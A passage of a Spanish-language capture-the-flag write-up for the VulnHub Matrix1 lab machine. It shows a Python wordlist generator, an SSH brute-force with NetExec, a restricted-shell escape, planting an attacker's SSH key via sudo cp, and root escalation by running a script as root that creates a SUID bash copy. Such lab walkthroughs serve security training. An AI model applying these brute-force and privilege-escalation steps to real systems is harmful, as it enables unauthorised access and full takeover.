</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_dictionary</span><span class=p>(</span><span class=n>filename</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>characters</span><span class=p>:</span> <span class=nb>list</span><span class=p>[</span><span class=nb>str</span><span class=p>]</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_uppercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>punctuation</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>base_password</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=s1>&#39;k1ll0r&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>char1</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>char2</span> <span class=ow>in</span> <span class=n>characters</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>base_password</span> <span class=o>+</span> <span class=n>char1</span> <span class=o>+</span><span class=n>char2</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Dictionary saved as </span><span class=si>{</span><span class=n>filename</span><span class=si>!r}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>create_dictionary</span><span class=p>(</span><span class=s2>&#34;password.dic&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>Este script crear√° un diccionario llamado <code>password.dic</code> con las posibles contrase√±as.</p><ul><li>Corremos en una terminal:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 create_dictionary.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Dictionary saved as &#39;password.dic&#39;
</span></span></span></code></pre></div><ul><li>Es entonces que podemos usar la herramienta <code>NetExec</code> para performar un <code>Brute Force Password Login</code> (intentar loguearse por fuerza bruta) a trav√©s del servicio <code>SSH</code> (que pudimos identificar que estaba corriendo en la m√°quina v√≠ctima gracias al scan inicial):</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.20.1.122 -u guest -p password.dic
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.20.1.122     22     10.20.1.122      [*] SSH-2.0-OpenSSH_7.7
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.20.1.122     22     10.20.1.122      [-] guest:k1ll0r00 Authentication failed.
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.20.1.122     22     10.20.1.122      [-] guest:k1ll0r01 Authentication failed.
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.20.1.122     22     10.20.1.122      [-] guest:k1ll0r02 Authentication failed.
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.20.1.122     22     10.20.1.122      [-] guest:k1ll0r7l Authentication failed.
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.20.1.122     22     10.20.1.122      [-] guest:k1ll0r7m Authentication failed.
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.20.1.122     22     10.20.1.122      [+] guest:k1ll0r7n (Pwn3d!) (root) Linux - Shell access!
</span></span></span></code></pre></div><p>Tenemos credenciales <code>guest:k1ll0r7n</code></p><ul><li>Y nos podemos conectar <code>SSH</code> con estas credenciales:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;k1ll0r7n&#39; ssh -o stricthostkeychecking=no guest@10.20.1.122
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last login: Mon Aug  6 16:25:44 2018 from 192.168.56.102
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>guest@porteus:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-rbash: whoami: command not found
</span></span></span></code></pre></div><ul><li>No obstante, al instante noto que estamos dentro de una <code>Restricted Bash</code>. Para escapar de este ambiente restringido (siguiendo algunos ejemplos de <a href=https://0xffsec.com/handbook/shells/restricted-shells/ class=external-link target=_blank rel=noopener>esta p√°gina</a>), podemos cerrar la sesi√≥n de <code>SSH</code>, reconectarnos y escapar de esta usando la flag <code>-t</code> para spawnear una shell con <code>bash</code>; escapando del ambiente restringido:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo sshpass -p &#39;k1ll0r7n&#39; ssh -o stricthostkeychecking=no guest@10.20.1.122 -t bash
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>guest@porteus:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>guest
</span></span></span></code></pre></div><ul><li>Ahora que hemos escapado, noto que podemos correr 2 comandos con <code>sudo</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>guest@porteus:~$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User guest may run the following commands on porteus:
</span></span></span><span class=line><span class=cl><span class=go>    (ALL) ALL
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
</span></span></span><span class=line><span class=cl><span class=go>    (trinity) NOPASSWD: /bin/cp
</span></span></span></code></pre></div><ul><li>El primer binario ni siquiera existe en el sistema. Sin embargo, <code>/bin/cp</code> es interesante dado que podemos correrlo como el usuario <code>trinity</code>. Inspeccionando <code>/home/trinity</code> es intersante dado que tenemos una carpeta <code>.ssh</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>guest@porteus:~$ ls -la /home/trinity
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 80
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 14 trinity trinity 4096 Aug  6  2018 ./
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  7 root    root    4096 Aug  6  2018 ../
</span></span></span><span class=line><span class=cl><span class=go>-rw-------  1 trinity trinity   52 Aug  6  2018 .Xauthority
</span></span></span><span class=line><span class=cl><span class=go>-rw-------  1 trinity trinity 2370 Aug 13  2018 .bash_history
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  5 trinity trinity 4096 Aug  6  2018 .cache/
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 11 trinity trinity 4096 Aug  6  2018 .config/
</span></span></span><span class=line><span class=cl><span class=go>drwx------  3 trinity trinity 4096 Aug  6  2018 .dbus/
</span></span></span><span class=line><span class=cl><span class=go>-rw-------  1 trinity trinity   16 Aug  6  2018 .esd_auth
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 trinity trinity 3729 Oct 23  2017 .screenrc
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 trinity trinity 4096 Aug 15 05:02 .ssh/
</span></span></span><span class=line><span class=cl><span class=go>drwx------  4 trinity trinity 4096 Aug  6  2018 .thumbnails/
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Desktop/
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Documents/
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Downloads/
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Music/
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Pictures/
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Public/
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 trinity trinity 4096 Aug  6  2018 Videos/
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x  1 trinity trinity 6056 Aug  6  2018 python*
</span></span></span></code></pre></div><ul><li>El plan a realizar es simple:<ol><li>Crear una key <code>SSH</code> en nuestra m√°quina de atacante. Esto crear√° 2 archivos: <code>id_rsa</code> y <code>id_rsa.pub</code>.</li><li>Abusando del binario <code>/bin/cp</code> con <code>sudo</code>, podemos correrlo como el usuario <code>trinity</code> y copiar el contenido de <code>id_rsa.pub</code> y pasarlo al archivo <code>/home/trinity/.ssh/authorized_keys</code>. De manera que, b√°sicamente, estamos agregando nuestra key de <code>SSH</code> como una key autorizada; esto nos permitir√° loguearnos como el usuario <code>trinity</code> a trav√©s de <code>SSH</code>. Para ello podemos tomar como ejemplo <code>GTFOBins</code> <a href=https://gtfobins.github.io/gtfobins/cp/#sudo class=external-link target=_blank rel=noopener>a trav√©s de su p√°gina web para el comando <code>cp</code></a>.</li><li>Una vez la key ha sido agregada, la usamos para loguearnos via <code>SSH</code> como el usuario <code>trinity</code>.</li></ol></li><li>De manera que, primero, creamos una key <code>SSH</code> en nuestra m√°quina de atacantes:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh-keygen -t rsa -b 4096
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Generating public/private rsa key pair.
</span></span></span><span class=line><span class=cl><span class=go>Enter file in which to save the key (/home/gunzf0x/.ssh/id_rsa): /home/gunzf0x/OtherMachines/VulnHub/Matrix1/content/fake_trinity_id_rsa
</span></span></span><span class=line><span class=cl><span class=go>Enter passphrase (empty for no passphrase):
</span></span></span><span class=line><span class=cl><span class=go>Enter same passphrase again:
</span></span></span><span class=line><span class=cl><span class=go>Your identification has been saved in /home/gunzf0x/OtherMachines/VulnHub/Matrix1/content/fake_trinity_id_rsa
</span></span></span><span class=line><span class=cl><span class=go>Your public key has been saved in /home/gunzf0x/OtherMachines/VulnHub/Matrix1/content/fake_trinity_id_rsa.pub
</span></span></span><span class=line><span class=cl><span class=go>The key fingerprint is:
</span></span></span><span class=line><span class=cl><span class=go>SHA256:WJKS4PHjX7iqzLGcmNdoqFBE+fnYr8r1uIBICsLUM0U gunzf0x@kali
</span></span></span><span class=line><span class=cl><span class=go>The key&#39;s randomart image is:
</span></span></span><span class=line><span class=cl><span class=go>+---[RSA 4096]----+
</span></span></span><span class=line><span class=cl><span class=go>|  +..E           |
</span></span></span><span class=line><span class=cl><span class=go>| oo+.. .         |
</span></span></span><span class=line><span class=cl><span class=go>| .o==.o .        |
</span></span></span><span class=line><span class=cl><span class=go>|o. .=o =         |
</span></span></span><span class=line><span class=cl><span class=go>|oo. .+o S        |
</span></span></span><span class=line><span class=cl><span class=go>|=o ...oo         |
</span></span></span><span class=line><span class=cl><span class=go>|+.oo. +.         |
</span></span></span><span class=line><span class=cl><span class=go>|o*+=.+ o.        |
</span></span></span><span class=line><span class=cl><span class=go>|=oB.+.+o.        |
</span></span></span><span class=line><span class=cl><span class=go>+----[SHA256]-----+
</span></span></span></code></pre></div><p>de donde he guardado esta con el nombre <code>fake_trinity_id_rsa</code>.
Esto crea 2 archivos en mi directorio, uno llamado <code>fake_trinity_id_rsa</code> y otro llamado <code>fake_trinity_id_rsa.pub</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 504
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 2 gunzf0x gunzf0x   4096 Aug 15 00:58 .
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 5 gunzf0x gunzf0x   4096 Aug 14 22:48 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r-- 1 gunzf0x gunzf0x   4121 Aug 14 23:23 Cypher.matrix
</span></span></span><span class=line><span class=cl><span class=go>-rw------- 1 gunzf0x gunzf0x   3381 Aug 15 00:58 fake_trinity_id_rsa
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 gunzf0x gunzf0x    738 Aug 15 00:58 fake_trinity_id_rsa.pub
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r-- 1 gunzf0x gunzf0x 481401 Aug 13  2018 p0rt_31337.png
</span></span></span></code></pre></div><ul><li>Leyendo el contenido del archivo <code>fake_trinity_id_rsa.pub</code> tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat fake_trinity_id_rsa.pub
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCpPGpmsDAWRBQ1HEUpbsClL6Bdh11NyrkQAKFPUaXVDap0UEHrUWB22hyxtFkMt0Xkqkco6d4TZhZYDyeshHM1vVaaMAcs2f1b6GLRpmkWLxGPtD0jriUsoTR0tcJJHp4ZWnUqeB2o0/6ZtA43kRRxFoGI7aNfVHaBzs2BPOjjciHIlKFTuxYUYWqubZO5FQA2xhD+GlmN9wKDSirl+CluMwj4h2RTXWXCRcSbNF5wIoSpitUSCyRiSUBnCNttdlhfrclU33MZiNF1q3TOs4J3wK6jGoJmbE/lI/RvNRvqwwTPMWFyhRKUwSGilRa0646OEyDf5Pmnd5Dk11qqc5tHFnwwRel3faaIjVxiKfiMdU4VsAy/7b34LSPayubj3wq/hi2SPJjEa2mvwItNK74UweZOkIeY1i0w1YEY2UHbQQHhELeMBzT9OGizeOCPd6eAaufdo/8wl6fxyffrxCKQE6nD60Fox701Tn7hJlD6lubKqS/BveI/ukwkkpWIdJL7cN3Vs/4k3eJQ4Pm+JosoNfFUx6/h6VoLO0t0IWSmYHdt0gV+O0UOkElw0U67VktA5LC3EdKkXCVGuSCvygSG5OTGBxCue7hYIDSqScwBAcT1szvMw8aRcpe5EOgep8wipe9d0MA3MZtWQdwBgxv55HVNH4d86E3ilT76O2q4OQ== gunzf0x@kali
</span></span></span></code></pre></div><ul><li>Copio el contenido de este archivo y lo guardo en la m√°quina v√≠ctima como el archivo <code>/tmp/temp_key</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>guest@porteus:~$ echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCpPGpmsDAWRBQ1HEUpbsClL6Bdh11NyrkQAKFPUaXVDap0UEHrUWB22hyxtFkMt0Xkqkco6d4TZhZYDyeshHM1vVaaMAcs2f1b6GLRpmkWLxGPtD0jriUsoTR0tcJJHp4ZWnUqeB2o0/6ZtA43kRRxFoGI7aNfVHaBzs2BPOjjciHIlKFTuxYUYWqubZO5FQA2xhD+GlmN9wKDSirl+CluMwj4h2RTXWXCRcSbNF5wIoSpitUSCyRiSUBnCNttdlhfrclU33MZiNF1q3TOs4J3wK6jGoJmbE/lI/RvNRvqwwTPMWFyhRKUwSGilRa0646OEyDf5Pmnd5Dk11qqc5tHFnwwRel3faaIjVxiKfiMdU4VsAy/7b34LSPayubj3wq/hi2SPJjEa2mvwItNK74UweZOkIeY1i0w1YEY2UHbQQHhELeMBzT9OGizeOCPd6eAaufdo/8wl6fxyffrxCKQE6nD60Fox701Tn7hJlD6lubKqS/BveI/ukwkkpWIdJL7cN3Vs/4k3eJQ4Pm+JosoNfFUx6/h6VoLO0t0IWSmYHdt0gV+O0UOkElw0U67VktA5LC3EdKkXCVGuSCvygSG5OTGBxCue7hYIDSqScwBAcT1szvMw8aRcpe5EOgep8wipe9d0MA3MZtWQdwBgxv55HVNH4d86E3ilT76O2q4OQ== gunzf0x@kali&#39; &gt; /tmp/temp_key
</span></span></span></code></pre></div><ul><li>Abusando del permiso asignado a <code>/bin/cp</code>, agregamos la key como <code>authorized_keys</code> junto con <code>sudo</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>guest@porteus:~$ sudo -u trinity /bin/cp /tmp/temp_key /home/trinity/.ssh/authorized_keys
</span></span></span></code></pre></div><ul><li>Ahora podemos tratar de loguearnos via <code>SSH</code> como el usuario <code>trinity</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i fake_trinity_id_rsa trinity@10.20.1.122
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last login: Mon Aug  6 16:37:45 2018 from 192.168.56.102
</span></span></span><span class=line><span class=cl><span class=go>trinity@porteus:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>trinity
</span></span></span></code></pre></div><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Revisando qu√© es lo que puede correr este nuevo usuario con <code>sudo</code> tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>trinity@porteus:~$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User trinity may run the following commands on porteus:
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /home/trinity/oracle
</span></span></span></code></pre></div><p>vemos que podemos correr el archivo <code>/home/trinity/oracle</code> como <code>root</code> sin proveer una contrase√±a.</p><ul><li>Sin embargo, noto que no existe ning√∫n archivo llamado <code>/home/trinity/oracle</code> en el directorio <code>/home/trinity</code> (como podemos ver de los logs mostrados un poco m√°s arriba). ¬øQu√© tal si creamos un script malicioso en el directorio <code>/home/trinity/</code> llamado <code>oracle</code>? Para esto creamos un simple script en <code>Bash</code> como sigue:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>cp <span class=k>$(</span>which bash<span class=k>)</span> /tmp/gunzf0x<span class=p>;</span> chmod <span class=m>4755</span> /tmp/gunzf0x
</span></span></code></pre></div><p>Este script crea una copia del <code>/bin/bash</code> y, a aquella copia, le asigna permisos <code>SUID</code>. Dado que el propietario <code>root</code>, seremos capaches de correr un binario <code>bash</code> con permisos del due√±o ( que ser√° <code>root</code>) y spawnear una shell como este usuario.
Podemos crear este archivo a trav√©s de un oneliner de <code>Bash</code> y luego asignarle permisos de ejecuci√≥n al script creado con el comando <code>chmod +x</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>trinity@porteus:~$ echo -e &#39;#!/bin/bash\ncp $(which bash) /tmp/gunzf0x; chmod 4755 /tmp/gunzf0x&#39; &gt; /home/trinity/oracle
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>trinity@porteus:~$ chmod +x /home/trinity/oracle
</span></span></span></code></pre></div><ul><li>Ahora, corro el script malicioso abusando del privilegio con <code>sudo</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>trinity@porteus:~$ sudo /home/trinity/oracle
</span></span></span></code></pre></div><ul><li>Si chequeamos el directorio <code>/tmp</code>, nuestro archivo malicioso est√° all√≠:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>trinity@porteus:~$ ls -la /tmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 1216
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt 31 root    root       4096 Aug 15 05:30 ./
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 51 root    root       4096 Aug  6  2018 ../
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--  1 root    root          2 Aug  6  2018 .psclock
</span></span></span><span class=line><span class=cl><span class=go>-rwsr-xr-x  1 root    root    1102944 Aug 15 05:30 gunzf0x*
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  4 root    root       4096 Aug 13  2018 server/
</span></span></span><span class=line><span class=cl><span class=go>drwx------  2 guest   users      4096 Aug  6  2018 ssh-0WcT6GDX7jGP/
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>donde puedo ver los permisos de √©ste como <code>-rwsr-xr-x</code>; lo cual indica que tiene permisos <code>SUID</code>.</p><ul><li>Corro la copia de <code>bash</code> con la flag <code>-p</code> para convertirnos en el usuario <code>root</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>trinity@porteus:~$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>trinity@porteus:~# whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>y eso es todo.
Podemos ver el contenido del directorio <code>/root</code> para ver la √∫ltima flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>trinity@porteus:~# cat /root/flag.txt
</span></span></span><span class=line><span class=cl><span class=go>   _,-.
</span></span></span><span class=line><span class=cl><span class=go>,-&#39;  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
</span></span></span><span class=line><span class=cl><span class=go>|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
</span></span></span><span class=line><span class=cl><span class=go>|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF
</span></span></span><span class=line><span class=cl><span class=go>|`-._`-.\,-&#39;_|  _,-&#39;.
</span></span></span><span class=line><span class=cl><span class=go>     `-.|.-&#39; | |`.-&#39;|_     WHAT
</span></span></span><span class=line><span class=cl><span class=go>        |      |_|,-&#39;_`.
</span></span></span><span class=line><span class=cl><span class=go>              |-._,-&#39;  |     NO, ME NEITHER
</span></span></span><span class=line><span class=cl><span class=go>         jrei | |    _,&#39;
</span></span></span><span class=line><span class=cl><span class=go>              &#39;-|_,-&#39;          IT&#39;S JUST A HYPOTHETICAL QUESTION
</span></span></span></code></pre></div><p>¬°M√°quina completada!</p><p><img alt="Matrix 4" src=/pentesting/images/Matrix1_4.png></p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>